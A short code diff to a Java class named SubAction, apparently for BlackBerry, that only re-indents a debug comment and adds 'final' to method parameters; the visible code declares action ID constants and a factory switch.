@@ -13,7 +13,7 @@ import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 
 public abstract class SubAction {
-	//#debug
+    //#debug
     protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE);
 
     public static final int ACTION = 0x4000;
@@ -27,7 +27,7 @@ public abstract class SubAction {
     public static final int ACTION_SYNC_PDA = ACTION + 0x8;
     public static final int ACTION_EXECUTE = ACTION + 0x9;
 
-    public static SubAction factory(int actionId_, byte[] confParams) {
+    public static SubAction factory(final int actionId_, final byte[] confParams) {
         switch (actionId_) {
         case ACTION_SYNC:
             // #debug
@@ -77,7 +77,7 @@ public abstract class SubAction {
 
     protected Status statusObj;
 
-    protected SubAction(int actionId_) {
+    protected SubAction(final int actionId_) {
         statusObj = Status.getInstance();
         this.actionId = actionId_;
     }
